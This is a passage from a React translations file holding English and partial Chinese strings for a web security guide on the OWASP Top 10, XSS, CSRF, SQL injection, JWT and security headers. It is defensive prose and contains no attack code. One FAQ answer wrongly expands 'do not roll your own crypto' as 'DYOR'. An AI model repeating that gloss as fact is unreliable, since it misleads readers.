'use client';
import React from 'react';

const translations: Record<string, Record<string, string>> = {
  en: {
    title: 'Web Security Guide: OWASP Top 10, XSS, CSRF, SQL Injection, and Best Practices',
    description: 'A comprehensive guide to web application security covering OWASP Top 10 (2021), XSS prevention, CSRF tokens, SQL injection, authentication hardening, JWT security, HTTPS/TLS, security headers, CORS, rate limiting, and dependency security.',
    intro: 'Web application security is no longer optional. With data breaches costing organizations an average of $4.45 million in 2023 according to IBM, and with attack surfaces growing as applications become more complex, developers must treat security as a first-class concern from day one. This guide covers the OWASP Top 10 vulnerabilities, common attack vectors, and practical defenses you can implement today.',
    tldrTitle: 'TL;DR — Security Quick Reference',
    tldrContent: 'The OWASP Top 10 lists the most critical web application security risks. XSS is prevented with output encoding and CSP. CSRF is mitigated with SameSite cookies and CSRF tokens. SQL injection is stopped with parameterized queries. Use bcrypt/Argon2 for passwords, HTTPS everywhere, strict security headers, and audit dependencies regularly.',
    keyTakeawaysTitle: 'Key Takeaways',
    kt1: 'Always use parameterized queries or prepared statements — never concatenate user input into SQL.',
    kt2: 'Implement Content Security Policy (CSP) headers to prevent XSS attacks.',
    kt3: 'Use SameSite=Strict or SameSite=Lax cookies combined with CSRF tokens for state-changing requests.',
    kt4: 'Hash passwords with bcrypt (cost 12+) or Argon2id — never store plaintext or use MD5/SHA-1.',
    kt5: 'Sign JWTs with RS256 or EdDSA — never use the "none" algorithm.',
    kt6: 'Enable HSTS, X-Frame-Options, X-Content-Type-Options, and Referrer-Policy headers.',
    kt7: 'Run npm audit, Snyk, or Dependabot on every CI pipeline run.',
    kt8: 'Rate-limit authentication endpoints to prevent brute-force and credential stuffing attacks.',

    owaspTitle: 'OWASP Top 10 (2021 Edition)',
    owaspIntro: 'The Open Web Application Security Project (OWASP) publishes a list of the 10 most critical web application security risks every few years. The 2021 edition reflects the evolving threat landscape with three new categories and reorganized priorities.',
    owaspA01: 'A01: Broken Access Control',
    owaspA01desc: 'Moving up from #5 to #1, broken access control means that users can act outside their intended permissions. This includes bypassing access checks, viewing other users\' data, elevating privileges, and metadata manipulation. 94% of tested applications had some form of broken access control.',
    owaspA02: 'A02: Cryptographic Failures',
    owaspA02desc: 'Previously called "Sensitive Data Exposure," this category focuses on failures in cryptography that lead to data exposure. Includes transmitting data in clear text, weak cryptographic algorithms (MD5, SHA-1, DES), and improper key management.',
    owaspA03: 'A03: Injection',
    owaspA03desc: 'SQL, NoSQL, OS command, LDAP, and other injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. An attacker can use injection to access unauthorized data, execute commands, and compromise the entire system.',
    owaspA04: 'A04: Insecure Design',
    owaspA04desc: 'A new category in 2021 focusing on design and architectural flaws. This is distinct from implementation bugs. Secure design requires threat modeling, secure design patterns, and reference architectures — not just secure coding.',
    owaspA05: 'A05: Security Misconfiguration',
    owaspA05desc: 'The most common issue — 90% of applications were tested with some form of misconfiguration. Missing hardening, unnecessary features enabled, default credentials, overly informative error messages, and missing security headers all fall here.',
    owaspA06: 'A06: Vulnerable and Outdated Components',
    owaspA06desc: 'Using components (libraries, frameworks, modules) with known vulnerabilities. Now includes both known CVEs and unmonitored components. Log4Shell (CVE-2021-44228) demonstrated how a single library vulnerability can affect millions of applications.',
    owaspA07: 'A07: Identification and Authentication Failures',
    owaspA07desc: 'Previously "Broken Authentication." Includes permitting weak passwords, missing MFA, improper session management, and credential stuffing vulnerabilities. Attackers have access to billions of leaked credential pairs from breaches.',
    owaspA08: 'A08: Software and Data Integrity Failures',
    owaspA08desc: 'A new 2021 category covering code and infrastructure that does not protect against integrity violations. Includes insecure CI/CD pipelines, auto-updates without signature verification, and deserialization of untrusted data.',
    owaspA09: 'A09: Security Logging and Monitoring Failures',
    owaspA09desc: 'Without logging and monitoring, breaches cannot be detected. This category covers insufficient logging, missing alerting, unmonitored logs, and log messages that are not actionable. Most breaches take months to detect without proper monitoring.',
    owaspA10: 'A10: Server-Side Request Forgery (SSRF)',
    owaspA10desc: 'A new addition for 2021. SSRF flaws occur when a web application fetches a remote resource without validating the user-supplied URL. Attackers can use SSRF to scan internal networks, access cloud metadata endpoints (AWS IMDS), or reach internal services.',

    xssTitle: 'Cross-Site Scripting (XSS)',
    xssIntro: 'XSS is one of the most prevalent vulnerabilities, affecting millions of websites. It occurs when an attacker injects malicious scripts into content delivered to other users. A successful XSS attack can steal session tokens, redirect users, deface websites, or install keyloggers.',
    xssTypesTitle: 'XSS Types',
    xssReflectedTitle: 'Reflected XSS',
    xssReflectedDesc: 'The malicious script is embedded in a URL and reflected off the server in the response. The victim must click a crafted link. Common in search results pages and error messages.',
    xssStoredTitle: 'Stored XSS (Persistent)',
    xssStoredDesc: 'The malicious script is stored on the server (database, file system) and served to every user who views the affected content. This is more dangerous since no user interaction beyond visiting the page is required. Common in comment systems, profile fields, and user-generated content.',
    xssDOMTitle: 'DOM-Based XSS',
    xssDOMDesc: 'The vulnerability exists in client-side code. The DOM is modified with attacker-controlled data. The server never sees the payload. Common with JavaScript that reads from location.hash, document.referrer, or localStorage.',
    xssPreventionTitle: 'XSS Prevention Strategies',
    xssOutputEncoding: 'Output Encoding',
    xssOutputEncodingDesc: 'Always encode untrusted data before inserting it into HTML. Use context-appropriate encoding: HTML entity encoding for HTML content, JavaScript encoding for JS contexts, URL encoding for URLs.',
    xssDOMPrevention: 'Safe DOM APIs',
    xssDOMPreventionDesc: 'Prefer textContent over innerHTML. Use createElement and setAttribute instead of building HTML strings. When you must use innerHTML, sanitize input with DOMPurify.',
    xssCSPTitle: 'Content Security Policy',
    xssCSPDesc: 'CSP is a browser security mechanism that restricts what resources a page can load. A strong CSP policy can prevent XSS even when other defenses fail.',

    csrfTitle: 'Cross-Site Request Forgery (CSRF)',
    csrfIntro: 'CSRF attacks trick authenticated users into submitting requests they did not intend to make. A malicious site can cause a user\'s browser to send requests to another site where the user is logged in. The server sees a legitimate-looking request with valid session cookies.',
    csrfHowTitle: 'How CSRF Works',
    csrfHowDesc: 'The attack exploits the browser\'s behavior of automatically including cookies with cross-origin requests. The attacker hosts a page with a hidden form or image tag that sends a request to the target site. The user\'s browser includes their session cookie, and the server processes the request.',
    csrfPreventionTitle: 'CSRF Prevention',
    csrfSameSite: 'SameSite Cookies',
    csrfSameSiteDesc: 'The SameSite cookie attribute controls when cookies are sent with cross-site requests. SameSite=Strict prevents all cross-site cookie sending. SameSite=Lax allows cookies in top-level navigations. This is the simplest and most effective CSRF defense.',
    csrfTokens: 'CSRF Tokens',
    csrfTokensDesc: 'Generate a unique, unpredictable token for each user session. Include this token in all state-changing forms and AJAX requests. Verify the token server-side before processing the request.',
    csrfDoubleSubmit: 'Double Submit Cookie',
    csrfDoubleSubmitDesc: 'Set a CSRF token as a cookie and require the same value to be sent as a request parameter. Since cross-site requests cannot read cookies (due to same-origin policy), this provides CSRF protection without server-side state.',

    sqlTitle: 'SQL Injection',
    sqlIntro: 'SQL injection remains one of the most dangerous vulnerabilities, allowing attackers to read sensitive data, modify database contents, execute admin operations, and even execute OS commands in some configurations. Despite being well understood, it still appears in the OWASP Top 10.',
    sqlHowTitle: 'How SQL Injection Works',
    sqlHowDesc: 'When user input is directly concatenated into SQL queries, an attacker can modify the query structure. By injecting SQL syntax, they can bypass authentication, extract data from other tables, or delete entire databases.',
    sqlPreventionTitle: 'SQL Injection Prevention',
    sqlParamQueries: 'Parameterized Queries',
    sqlParamQueriesDesc: 'Always use parameterized queries (prepared statements). The query structure is defined separately from the data, making injection impossible. This is the most effective defense.',
    sqlORM: 'ORM Protection',
    sqlORMDesc: 'Modern ORMs like Sequelize, TypeORM, Prisma, and Hibernate use parameterized queries by default. Avoid raw query methods and be careful with orderBy clauses, which may not be parameterized.',
    sqlValidation: 'Input Validation',
    sqlValidationDesc: 'Validate input types, lengths, and formats. Use allowlists for values that should only come from a defined set (like column names for ORDER BY). This is a secondary defense, not a replacement for parameterized queries.',

    authTitle: 'Authentication Security',
    authIntro: 'Authentication is the gateway to your application. Weak authentication is one of the top causes of data breaches. This section covers password security, MFA, and session management.',
    authPasswordTitle: 'Password Hashing',
    authPasswordDesc: 'Never store plaintext passwords or use fast general-purpose hash functions (MD5, SHA-1, SHA-256). Use purpose-built password hashing algorithms that are intentionally slow and memory-intensive. OWASP recommends Argon2id as the primary choice.',
    authMFATitle: 'Multi-Factor Authentication',
    authMFADesc: 'MFA adds a second layer of authentication beyond passwords. Implement TOTP (Time-based One-Time Passwords) using apps like Google Authenticator or Authy. Consider hardware security keys (FIDO2/WebAuthn) for high-security applications.',
    authSessionTitle: 'Session Management',
    authSessionDesc: 'Generate cryptographically random session IDs with at least 128 bits of entropy. Regenerate session IDs after authentication. Set proper expiration times. Invalidate sessions on logout and implement idle timeout.',

    jwtTitle: 'JWT Security',
    jwtIntro: 'JSON Web Tokens are widely used for stateless authentication, but they are frequently misconfigured. A single JWT security mistake can allow attackers to forge tokens and impersonate any user.',
    jwtAlgoTitle: 'Algorithm Security',
    jwtAlgoDesc: 'Always specify and verify the signing algorithm server-side. The "alg: none" attack bypasses verification. The algorithm confusion attack downgrades RS256 to HS256. Use RS256, ES256, or EdDSA for asymmetric signing.',
    jwtExpirationTitle: 'Expiration and Refresh Tokens',
    jwtExpirationDesc: 'Set short expiration times for access tokens (15-60 minutes). Use refresh tokens with longer lifetimes stored securely (HttpOnly cookies). Implement refresh token rotation to detect theft.',
    jwtRevocationTitle: 'Token Revocation',
    jwtRevocationDesc: 'Stateless JWTs cannot be revoked until they expire. Implement a token blocklist using Redis for logout or compromised token scenarios. Alternatively, use short-lived tokens with refresh rotation.',

    httpsTitle: 'HTTPS and TLS',
    httpsIntro: 'HTTPS encrypts all communication between clients and servers. Without it, session tokens, credentials, and sensitive data are visible to network attackers. HTTPS is no longer optional — it is the baseline.',
    hstTitle: 'HTTP Strict Transport Security (HSTS)',
    hstDesc: 'HSTS tells browsers to always use HTTPS for your domain. This prevents SSL stripping attacks and protocol downgrade attacks. Use a max-age of at least one year (31536000 seconds) and include subdomains.',
    certPinTitle: 'Certificate Transparency',
    certPinDesc: 'Certificate Transparency logs help detect misissued certificates. Monitor CT logs for unexpected certificates issued for your domains. Use the Expect-CT header to enforce CT checking.',
    mixedContentTitle: 'Mixed Content',
    mixedContentDesc: 'Mixed content occurs when an HTTPS page loads resources over HTTP. Modern browsers block active mixed content (scripts, iframes) but may still load passive mixed content (images). Always serve all resources over HTTPS.',

    headersTitle: 'Security Headers',
    headersIntro: 'Security headers are HTTP response headers that instruct browsers to enable security mechanisms. They provide defense-in-depth and protect against common attacks with minimal implementation effort.',
    headerCSP: 'Content-Security-Policy',
    headerCSPDesc: 'Controls which resources the browser is allowed to load. Prevents XSS, data injection attacks, and clickjacking. Use nonces or hashes for inline scripts instead of unsafe-inline.',
    headerXFrame: 'X-Frame-Options',
    headerXFrameDesc: 'Prevents your page from being embedded in iframes on other sites. This mitigates clickjacking attacks. Use DENY or SAMEORIGIN. CSP frame-ancestors is the modern replacement.',
    headerXContent: 'X-Content-Type-Options',
    headerXContentDesc: 'Prevents browsers from MIME-sniffing responses. Set to "nosniff" to force browsers to respect the declared Content-Type. Prevents attacks that rely on confusing the browser about file types.',
    headerReferrer: 'Referrer-Policy',
    headerReferrerDesc: 'Controls how much referrer information is included in requests. Use "strict-origin-when-cross-origin" to prevent leaking full URLs to third parties while preserving analytics.',
    headerPermissions: 'Permissions-Policy',
    headerPermissionsDesc: 'Controls which browser features (camera, microphone, geolocation) can be used. Restricts features your application does not need, reducing the attack surface.',

    corsTitle: 'CORS Configuration',
    corsIntro: 'Cross-Origin Resource Sharing (CORS) controls which origins can access your API. Misconfigured CORS can allow malicious sites to make authenticated requests to your API on behalf of your users.',
    corsOriginsTitle: 'Allowlisting Origins',
    corsOriginsDesc: 'Never use the wildcard (*) for origins when credentials are involved. Maintain an explicit allowlist of permitted origins. Validate the Origin header against this allowlist before sending Access-Control-Allow-Origin.',
    corsCredentialsTitle: 'Credentials and Cookies',
    corsCredentialsDesc: 'When Access-Control-Allow-Credentials is true, you must specify an explicit origin — not a wildcard. This controls whether browsers include cookies and authorization headers in cross-origin requests.',
    corsPreflightTitle: 'Preflight Requests',
    corsPreflightDesc: 'Browsers send OPTIONS preflight requests before complex cross-origin requests. Respond with appropriate Access-Control-Allow-Methods and Access-Control-Allow-Headers. Cache preflight responses with Access-Control-Max-Age.',

    rateLimitTitle: 'Rate Limiting and DDoS Protection',
    rateLimitIntro: 'Rate limiting prevents abuse of your API endpoints. Without it, attackers can brute-force passwords, scrape data, spam endpoints, and overwhelm your infrastructure.',
    rateLimitStrategiesTitle: 'Rate Limiting Strategies',
    rateLimitAuth: 'Authentication Endpoints',
    rateLimitAuthDesc: 'Apply strict rate limits to login, registration, and password reset endpoints. Use exponential backoff after failed attempts. Implement account lockout after N consecutive failures.',
    rateLimitAPI: 'API Rate Limiting',
    rateLimitAPIDesc: 'Rate limit by IP address, user ID, and API key. Use sliding window algorithms for accuracy. Return 429 Too Many Requests with Retry-After headers. Consider different limits for free and paid tiers.',
    ddosTitle: 'DDoS Mitigation',
    ddosDesc: 'Use CDN providers like Cloudflare, Fastly, or AWS Shield for DDoS protection. Implement connection rate limiting at the network level. Set aggressive timeouts for slow HTTP attacks.',

    depsTitle: 'Dependency Security',
    depsIntro: 'Modern applications depend on hundreds or thousands of third-party packages. Each dependency is a potential attack surface. Supply chain attacks (like the SolarWinds breach) have shown that trusted packages can be compromised.',
    depsAuditTitle: 'Automated Vulnerability Scanning',
    depsAuditDesc: 'Run npm audit, yarn audit, or pnpm audit in your CI pipeline. Integrate Snyk, Dependabot, or GitHub Dependabot for automated pull requests when vulnerabilities are discovered. Set severity thresholds that fail the build.',
    depsSBOMTitle: 'Software Bill of Materials (SBOM)',
    depsSBOMDesc: 'An SBOM is a formal record of all components in your software. Generate SBOMs using tools like Syft, CycloneDX, or SPDX. Required by US executive order for federal software and increasingly required in enterprise procurement.',
    depsLockTitle: 'Lock Files',
    depsLockDesc: 'Always commit lock files (package-lock.json, yarn.lock, pnpm-lock.yaml). Lock files ensure reproducible builds and prevent dependency confusion attacks. Use npm ci instead of npm install in CI/CD.',

    testingTitle: 'Security Testing',
    testingIntro: 'Security testing should be integrated into every stage of the software development lifecycle, not just done once before deployment.',
    testingSASTTitle: 'Static Analysis (SAST)',
    testingSASTDesc: 'SAST tools analyze source code without executing it. Tools include Semgrep, ESLint security plugins, SonarQube, and CodeQL. Integrate into your IDE and CI pipeline for immediate feedback.',
    testingDASTTitle: 'Dynamic Analysis (DAST)',
    testingDASTDesc: 'DAST tools test running applications from the outside. OWASP ZAP and Burp Suite are popular choices. Run DAST against your staging environment in CI. Catch vulnerabilities like XSS, injection, and authentication bypasses.',
    testingPentestTitle: 'Penetration Testing',
    testingPentestDesc: 'Periodic penetration testing by security professionals provides a comprehensive assessment. Use a structured methodology like OWASP Testing Guide. Consider bug bounty programs for continuous security assessment.',

    cvssTitle: 'CVSS Vulnerability Scoring',
    cvssIntro: 'The Common Vulnerability Scoring System (CVSS) provides a standardized way to rate the severity of security vulnerabilities on a scale from 0 to 10.',

    faqTitle: 'Frequently Asked Questions',
    faq1q: 'What is the difference between authentication and authorization?',
    faq1a: 'Authentication verifies who you are (e.g., username and password check). Authorization determines what you are allowed to do (e.g., checking if you have permission to access a resource). Both must be implemented correctly — authentication without authorization means all users can access all resources, and authorization without authentication means you cannot know who is making the request.',
    faq2q: 'Is HTTPS enough to secure a web application?',
    faq2a: 'HTTPS encrypts data in transit but is not sufficient on its own. You also need: input validation and output encoding to prevent injection attacks, proper authentication and session management, authorization checks on every request, security headers, dependency scanning, and regular security testing. HTTPS prevents network eavesdropping and man-in-the-middle attacks but does not protect against application-layer vulnerabilities.',
    faq3q: 'How do I prevent SQL injection in an ORM?',
    faq3a: 'Most ORMs (Prisma, TypeORM, Sequelize, Hibernate) use parameterized queries by default for standard operations. However, you must be careful with: raw query methods (where you can pass string templates), orderBy or orderByRaw clauses where user input determines sort columns, and dynamic column selection. Always use the ORM\'s safe API for passing values and validate user input used in ORDER BY or GROUP BY clauses against a whitelist.',
    faq4q: 'What should I store in JWT access tokens?',
    faq4a: 'Store only the minimum necessary claims in access tokens: user ID, roles/permissions, expiration time (exp), issued-at time (iat), and issuer (iss). Never store sensitive data like passwords, full personal information, or financial data in JWTs. Remember that JWT payloads are base64-encoded, not encrypted — they are readable by anyone with the token unless you use JWE (JSON Web Encryption).',
    faq5q: 'How should I handle security incidents and vulnerability disclosure?',
    faq5a: 'Establish a security.txt file at /.well-known/security.txt with your responsible disclosure policy and contact information. When a vulnerability is reported: acknowledge within 24 hours, fix critical vulnerabilities within 72 hours, fix high vulnerabilities within 7 days, communicate progress to reporters, and consider a CVE assignment for significant vulnerabilities. Consider a bug bounty program for continuous researcher engagement.',
    faq6q: 'What is the difference between XSS and CSRF?',
    faq6a: 'XSS (Cross-Site Scripting) injects malicious scripts into your page that run in other users\' browsers — the attack targets your users through your site. CSRF (Cross-Site Request Forgery) tricks users\' browsers into making unintended requests to your site — the attack targets your site through your users\' browsers. XSS breaks the same-origin policy from the target site\'s perspective; CSRF exploits the browser\'s behavior of including credentials in cross-origin requests.',
    faq7q: 'Should I roll my own cryptography?',
    faq7a: 'Almost never. Cryptographic primitives are extremely difficult to implement correctly. Even experienced cryptographers make mistakes. Use well-audited, widely deployed libraries: the Web Crypto API in browsers, libsodium for low-level needs, bcrypt/Argon2 libraries for password hashing, and battle-tested TLS libraries. The principle is "do not roll your own crypto" (DYOR). If you genuinely need a custom cryptographic primitive, you need a formal security audit.',
    faq8q: 'How do I securely store API keys and secrets in production?',
    faq8a: 'Never hard-code secrets in source code or commit them to version control. Use a secrets management solution: HashiCorp Vault, AWS Secrets Manager, Google Secret Manager, or Azure Key Vault. For containers, inject secrets as environment variables at runtime. Use short-lived credentials with automatic rotation where possible. Audit secret access logs. For development, use .env files (never committed) with tools like dotenv-vault for team sharing.',
  },
  zh: {
    title: 'Web 安全指南：OWASP Top 10、XSS、CSRF、SQL 注入与最佳实践',
    description: '全面的 Web 应用安全指南，涵盖 OWASP Top 10（2021）、XSS 防御、CSRF 令牌、SQL 注入、身份验证加固、JWT 安全、HTTPS/TLS、安全响应头、CORS、限流与依赖安全。',
    intro: 'Web 应用安全已不再是可选项。根据 IBM 统计，2023 年数据泄露的平均成本为 445 万美元，随着应用复杂度的提升，攻击面也在不断扩大，开发者必须从第一天起就将安全视为核心关注点。本指南涵盖 OWASP Top 10 漏洞、常见攻击手段以及可立即实施的实用防御措施。',
    tldrTitle: 'TL;DR — 安全快速参考',
    tldrContent: 'OWASP Top 10 列出了最关键的 Web 应用安全风险。XSS 通过输出编码和 CSP 防御。CSRF 通过 SameSite Cookie 和 CSRF 令牌缓解。SQL 注入通过参数化查询阻止。密码使用 bcrypt/Argon2，全站 HTTPS，严格安全响应头，定期审计依赖项。',
    keyTakeawaysTitle: '核心要点',
    kt1: '始终使用参数化查询或预处理语句——绝不将用户输入直接拼接到 SQL 中。',
    kt2: '实现 Content Security Policy (CSP) 响应头以防止 XSS 攻击。',
    kt3: '对状态变更请求结合使用 SameSite=Strict/Lax Cookie 和 CSRF 令牌。',
    kt4: '使用 bcrypt（成本因子 12+）或 Argon2id 哈希密码——绝不明文存储，不使用 MD5/SHA-1。',
    kt5: '使用 RS256 或 EdDSA 签名 JWT——绝不使用 "none" 算法。',
    kt6: '启用 HSTS、X-Frame-Options、X-Content-Type-Options 和 Referrer-Policy 响应头。',
    kt7: '每次 CI 构建时运行 npm audit、Snyk 或 Dependabot。',
    kt8: '对认证端点实施限流，防止暴力破解和凭证填充攻击。',

    owaspTitle: 'OWASP Top 10（2021 版）',
    owaspIntro: 'Open Web Application Security Project (OWASP) 每隔几年发布一次包含 10 个最关键 Web 应用安全风险的列表。2021 年版新增了三个类别并重新排序优先级。',
    owaspA01: 'A01：访问控制失效',
    owaspA01desc: '从第 5 名升至第 1 名，访问控制失效意味着用户可以在其预期权限之外进行操作。包括绕过访问检查、查看其他用户数据、权限提升和元数据操纵。94% 的被测应用存在某种形式的访问控制失效。',
    owaspA02: 'A02：加密机制失效',
    owaspA02desc: '原名"敏感数据泄露"，该类别聚焦于导致数据泄露的加密失效。包括明文传输数据、弱加密算法（MD5、SHA-1、DES）和不当的密钥管理。',
    owaspA03: 'A03：注入',
    owaspA03desc: '当不可信数据作为命令或查询的一部分发送给解释器时，就会发生 SQL、NoSQL、OS 命令、LDAP 等注入漏洞。攻击者可利用注入访问未授权数据、执行命令，甚至危及整个系统。',
    owaspA04: 'A04：不安全设计',
    owaspA04desc: '2021 年新增类别，聚焦于设计和架构层面的缺陷。这与实现层面的漏洞不同。安全设计需要威胁建模、安全设计模式和参考架构，不只是安全编码。',
    owaspA05: 'A05：安全配置错误',
    owaspA05desc: '最常见的问题 — 90% 的应用都存在某种配置错误。缺少安全加固、启用不必要功能、默认凭证、过度详细的错误信息和缺少安全响应头都属于此类。',
    owaspA06: 'A06：自带缺陷和过时的组件',
    owaspA06desc: '使用已知漏洞的组件（库、框架、模块）。现在包括已知 CVE 和未监控的组件。Log4Shell（CVE-2021-44228）展示了单个库漏洞如何影响数百万应用。',
    owaspA07: 'A07：身份验证和认证失效',
    owaspA07desc: '原名"身份认证破坏"。包括允许弱密码、缺少 MFA、不当的会话管理和凭证填充漏洞。攻击者可以利用从数据泄露中获取的数十亿泄露凭证对进行攻击。',
    owaspA08: 'A08：软件和数据完整性失效',
    owaspA08desc: '2021 年新增类别，涵盖不保护完整性的代码和基础设施。包括不安全的 CI/CD 流水线、无签名验证的自动更新和不可信数据的反序列化。',
    owaspA09: 'A09：安全日志和监控失效',
    owaspA09desc: '没有日志和监控就无法检测到攻击。该类别涵盖日志不足、缺少告警、未监控的日志和不可操作的日志消息。没有适当监控的情况下，大多数入侵需要数月才能被发现。',
    owaspA10: 'A10：服务端请求伪造 (SSRF)',
    owaspA10desc: '2021 年新增。当 Web 应用在未验证用户提供的 URL 的情况下获取远程资源时，就会发生 SSRF 漏洞。攻击者可利用 SSRF 扫描内网、访问云元数据端点（AWS IMDS）或访问内部服务。',

    xssTitle: '跨站脚本 (XSS)',
    xssIntro: 'XSS 是最普遍的漏洞之一，影响数百万网站。当攻击者将恶意脚本注入到发送给其他用户的内容中时就会发生。成功的 XSS 攻击可以窃取会话令牌、重定向用户、篡改网站或安装键盘记录器。',
    xssTypesTitle: 'XSS 类型',
    xssReflectedTitle: '反射型 XSS',
    xssReflectedDesc: '恶意脚本嵌入 URL 并从服务器响应中反射出来。受害者必须点击精心构造的链接。常见于搜索结果页面和错误消息。',
    xssStoredTitle: '存储型 XSS（持久型）',
    xssStoredDesc: '恶意脚本存储在服务器上（数据库、文件系统），并提供给每个查看受影响内容的用户。这更危险，因为除访问页面外不需要任何用户交互。常见于评论系统、个人资料字段和用户生成内容。',
    xssDOMTitle: '基于 DOM 的 XSS',
    xssDOMDesc: '漏洞存在于客户端代码中。DOM 被攻击者控制的数据修改。服务器永远不会看到有效载荷。常见于读取 location.hash、document.referrer 或 localStorage 的 JavaScript。',
    xssPreventionTitle: 'XSS 防御策略',
    xssOutputEncoding: '输出编码',
    xssOutputEncodingDesc: '将不可信数据插入 HTML 前始终进行编码。使用上下文适当的编码：HTML 内容使用 HTML 实体编码，JS 上下文使用 JavaScript 编码，URL 使用 URL 编码。',
    xssDOMPrevention: '安全的 DOM API',
    xssDOMPreventionDesc: '优先使用 textContent 而非 innerHTML。使用 createElement 和 setAttribute 而不是构建 HTML 字符串。必须使用 innerHTML 时，用 DOMPurify 净化输入。',
    xssCSPTitle: '内容安全策略',
    xssCSPDesc: 'CSP 是一种浏览器安全机制，限制页面可以加载哪些资源。强有力的 CSP 策略即使在其他防御失败时也能防止 XSS。',

    csrfTitle: '跨站请求伪造 (CSRF)',
    csrfIntro: 'CSRF 攻击诱使已认证用户提交他们不打算提交的请求。恶意网站可以使用户的浏览器向用户已登录的另一个网站发送请求。服务器看到的是带有有效会话 Cookie 的看似合法的请求。',
    csrfHowTitle: 'CSRF 工作原理',
    csrfHowDesc: '该攻击利用浏览器自动在跨域请求中包含 Cookie 的行为。攻击者托管一个带有隐藏表单或 img 标签的页面，向目标网站发送请求。用户的浏览器包含其会话 Cookie，服务器处理该请求。',
    csrfPreventionTitle: 'CSRF 防御',
    csrfSameSite: 'SameSite Cookie',
    csrfSameSiteDesc: 'SameSite Cookie 属性控制跨站请求时是否发送 Cookie。SameSite=Strict 阻止所有跨站 Cookie 发送。SameSite=Lax 允许顶级导航中的 Cookie。这是最简单最有效的 CSRF 防御。',
    csrfTokens: 'CSRF 令牌',
    csrfTokensDesc: '为每个用户会话生成唯一的不可预测令牌。在所有状态变更表单和 AJAX 请求中包含此令牌。在处理请求前在服务端验证令牌。',
    csrfDoubleSubmit: '双重提交 Cookie',
    csrfDoubleSubmitDesc: '将 CSRF 令牌设置为 Cookie，并要求在请求参数中发送相同的值。由于跨站请求无法读取 Cookie（由于同源策略），这在不需要服务器端状态的情况下提供了 CSRF 保护。',

    sqlTitle: 'SQL 注入',
    sqlIntro: 'SQL 注入仍然是最危险的漏洞之一，允许攻击者读取敏感数据、修改数据库内容、执行管理员操作，在某些配置中甚至可以执行 OS 命令。尽管广为人知，它仍然出现在 OWASP Top 10 中。',
    sqlHowTitle: 'SQL 注入工作原理',
    sqlHowDesc: '当用户输入直接拼接到 SQL 查询中时，攻击者可以修改查询结构。通过注入 SQL 语法，他们可以绕过身份验证、从其他表提取数据或删除整个数据库。',
    sqlPreventionTitle: 'SQL 注入防御',
    sqlParamQueries: '参数化查询',
    sqlParamQueriesDesc: '始终使用参数化查询（预处理语句）。查询结构与数据分开定义，使注入成为不可能。这是最有效的防御方法。',
    sqlORM: 'ORM 保护',
    sqlORMDesc: '现代 ORM（如 Prisma、TypeORM、Sequelize、Hibernate）默认对标准操作使用参数化查询。避免使用原始查询方法，并注意 orderBy 子句（可能未被参数化）。',
    sqlValidation: '输入验证',
    sqlValidationDesc: '验证输入类型、长度和格式。对只能来自定义集合的值（如用于 ORDER BY 的列名）使用白名单。这是辅助防御，不能替代参数化查询。',

    authTitle: '身份验证安全',
    authIntro: '身份验证是应用的大门。弱身份验证是数据泄露的主要原因之一。本节涵盖密码安全、MFA 和会话管理。',
    authPasswordTitle: '密码哈希',
    authPasswordDesc: '绝不明文存储密码，也不使用快速通用哈希函数（MD5、SHA-1、SHA-256）。使用专用密码哈希算法，这些算法故意设计得缓慢且内存密集。OWASP 推荐 Argon2id 作为首选。',
    authMFATitle: '多因素认证',
    authMFADesc: 'MFA 在密码之外增加第二层认证。使用 Google Authenticator 或 Authy 等应用实现 TOTP（基于时间的一次性密码）。对高安全性应用考虑使用硬件安全密钥（FIDO2/WebAuthn）。',
    authSessionTitle: '会话管理',
    authSessionDesc: '生成至少 128 位熵的加密随机会话 ID。在认证后重新生成会话 ID。设置适当的过期时间。在注销时使会话失效并实施空闲超时。',

    jwtTitle: 'JWT 安全',
    jwtIntro: 'JSON Web Token 广泛用于无状态认证，但经常被错误配置。单个 JWT 安全错误可能允许攻击者伪造令牌并冒充任何用户。',
    jwtAlgoTitle: '算法安全',
    jwtAlgoDesc: '始终在服务端指定并验证签名算法。"alg: none" 攻击绕过验证。算法混淆攻击将 RS256 降级为 HS256。使用 RS256、ES256 或 EdDSA 进行非对称签名。',
    jwtExpirationTitle: '过期时间和刷新令牌',
    jwtExpirationDesc: '为访问令牌设置较短的过期时间（15-60 分钟）。使用较长生命周期的刷新令牌安全存储（HttpOnly Cookie）。实现刷新令牌轮换以检测盗窃。',
    jwtRevocationTitle: '令牌吊销',
    jwtRevocationDesc: '无状态 JWT 在过期前无法被吊销。使用 Redis 实现令牌黑名单以应对注销或令牌泄露场景。或者，使用短生命周期令牌配合刷新轮换。',

    httpsTitle: 'HTTPS 和 TLS',
    httpsIntro: 'HTTPS 加密客户端和服务器之间的所有通信。没有它，会话令牌、凭证和敏感数据对网络攻击者是可见的。HTTPS 已不再是可选项，而是基准要求。',
    hstTitle: 'HTTP 严格传输安全 (HSTS)',
    hstDesc: 'HSTS 告诉浏览器始终为您的域名使用 HTTPS。这防止 SSL 剥离攻击和协议降级攻击。使用至少一年的 max-age（31536000 秒）并包含子域名。',
    certPinTitle: '证书透明度',
    certPinDesc: '证书透明度日志帮助检测错误颁发的证书。监控 CT 日志以发现为您的域名意外颁发的证书。使用 Expect-CT 头强制 CT 检查。',
    mixedContentTitle: '混合内容',
    mixedContentDesc: '当 HTTPS 页面通过 HTTP 加载资源时发生混合内容。现代浏览器阻止活动混合内容（脚本、iframe），但可能仍会加载被动混合内容（图片）。始终通过 HTTPS 提供所有资源。',

    headersTitle: '安全响应头',
    headersIntro: '安全响应头是指示浏览器启用安全机制的 HTTP 响应头。它们提供纵深防御，以最小的实施工作量防御常见攻击。',
    headerCSP: 'Content-Security-Policy',
    headerCSPDesc: '控制浏览器允许加载哪些资源。防止 XSS、数据注入攻击和点击劫持。对内联脚本使用 nonce 或 hash 而非 unsafe-inline。',
    headerXFrame: 'X-Frame-Options',
    headerXFrameDesc: '防止您的页面被其他网站的 iframe 嵌入。缓解点击劫持攻击。使用 DENY 或 SAMEORIGIN。CSP frame-ancestors 是现代替代方案。',
    headerXContent: 'X-Content-Type-Options',
    headerXContentDesc: '防止浏览器 MIME 嗅探响应。设置为 "nosniff" 强制浏览器遵守声明的 Content-Type。防止依赖混淆浏览器文件类型的攻击。',
    headerReferrer: 'Referrer-Policy',
    headerReferrerDesc: '控制请求中包含多少引用来源信息。使用 "strict-origin-when-cross-origin" 防止向第三方泄露完整 URL，同时保留分析数据。',
    headerPermissions: 'Permissions-Policy',
